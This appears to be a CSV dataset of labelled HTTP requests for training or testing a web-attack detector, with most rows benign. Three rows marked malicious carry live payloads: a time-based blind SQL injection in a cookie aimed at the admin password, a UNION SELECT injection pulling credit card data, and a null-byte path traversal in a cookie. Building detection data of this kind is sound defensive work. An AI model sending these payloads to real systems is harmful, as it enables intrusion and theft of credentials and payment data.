label,text
malicious,"POST /api/v1/user/update HTTP/1.1
Host: neonlightsupplychain.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Cookie: session_token=abc123def456; tracking_id=xyz' OR /*!IF*/(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61, SLEEP(5),0) -- -

email=user%40neonlightsupplychain.biz&name=John+Doe"
benign,"POST /v1/chat/sendMessage HTTP/1.1
Host: api.nextgen-messaging.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Referer: https://dashboard.nextgen-messaging.ai/
Origin: https://dashboard.nextgen-messaging.ai
Content-Length: 108
Connection: close

{""chatRoomId"":""f6a89d34cd"",""texts"":[""Hello team!"",""Meeting starts at 3pm."",""Please review the last notes.""]}"
benign,"GET /images/backgrounds/landing_hero.jpg HTTP/1.1
Host: media-personal-blog-site.info
If-None-Match: ""bbadf32458c7e2b55ce6fec912a4f002""
Accept: image/jpeg,image/webp,image/apng,image/*,*/*;q=0.8
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
malicious,"GET /api/v2/search?query=laptop&filter_evil_chars=true&query=%27%20UNION%20SELECT%20credit_card%20FROM%20users-- HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0
Referer: https://app.cloud-data-services.ai/home
Connection: keep-alive"
benign,"GET /assets/icons/notification.svg HTTP/1.1
Host: fintech-cloud-services.org
If-None-Match: W/""d41d8cd98f00b204e9800998ecf8427e""
Accept: image/svg+xml,image/*,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
malicious,"PUT /api/v2/user/settings HTTP/1.1
Host: user-management-suite.cloud
User-Agent: Python-urllib/3.9
Accept: application/json
Content-Type: application/json
Cookie: theme_file=../../../../themes/default/main.css%00en-GB; jwt=eyJhbGciOiJSUzI1NiIsImtpZCI6IjY2NjY2In0
Content-Length: 39

{""notifications"":true,""language"":""en-US""}"
benign,"GET /dashboard/home HTTP/1.1
Host: portal-user-access.net
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Cookie: user_prefs_b64=eyJmb250IjoiQXJpYWwiLCJsaW5rUHJlZmVycmVkIjoiaHR0cCU6Ly9wb3J0YWwtdXNlci1hY2Nlc3MubmV0L2FjY291bnQifQ==; session_token=Lp83Jh92ma
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.135 Safari/537.36"
benign,"GET /weather/forecast/week?location=portland,or HTTP/1.1
Host: local-weather-providers.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/xml,text/xml,text/html;q=0.8
Referer: https://local-weather-providers.org/home
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /products/electronics/tv/details?model=xyz-6000 HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
DNT: 1
Referer: https://online-retail-store.biz/
Connection: keep-alive"
benign,"PUT /api/data/item123 HTTP/1.1
Host: digital-archive-solutions.tech
Accept-Encoding: br, gzip, deflate
Content-Type: text/plain
Content-Length: 29
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.126 Safari/537.36
Origin: https://client.digital-archive-solutions.tech

Metadata updated for asset 442"
